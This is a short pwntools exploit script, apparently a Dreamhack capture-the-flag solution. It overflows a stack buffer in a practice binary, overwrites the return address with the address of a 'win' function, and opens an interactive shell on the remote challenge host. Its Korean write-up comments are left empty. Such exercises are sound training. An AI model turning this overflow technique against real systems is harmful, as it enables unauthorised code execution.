from pwn import *

e = ELF('./bof')

# Local
#r = process('./bof')

# Remote
r = remote('host3.dreamhack.games', 19229)

# 풀이
# 1. 취약점 발생 지점
#     1) 대상 기능 : 
#     2) 
# 2. 공격 방식
#     1) 


GET_SHELL = e.symbols['win']

DUMMY01 = b'A' * 128 + b'B' * 0x18

PAYLOAD = DUMMY01 + p64(GET_SHELL)
DUMMY02 = b'C' * (4096 - len(PAYLOAD))
DUMMY03 = b'C' * 4096

r.send(PAYLOAD)
#r.send(DUMMY02)

r.interactive()